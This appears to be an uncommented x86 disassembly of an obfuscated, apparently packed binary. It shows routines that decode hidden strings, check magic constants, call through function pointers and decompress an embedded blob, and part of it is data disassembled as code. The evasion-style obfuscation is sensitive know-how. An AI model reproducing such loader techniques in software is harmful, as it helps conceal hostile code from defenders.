  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42a9ef
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429767
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	and    eax,0x3cdb381
  424069:	mov    dl,BYTE PTR [edi]
  42406b:	dec    ebp
  42406c:	sahf   
  42406d:	aas    
  42406e:	xchg   esi,eax
  42406f:	pop    ss
  424070:	fs add al,0x83
  424073:	jne    0x424076
  424075:	add    BYTE PTR [eax],al
  424077:	add    BYTE PTR [ebx+0x3a],al
  42407a:	pop    esp
  42407b:	inc    esi
  42407c:	outs   dx,DWORD PTR ds:[esi]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
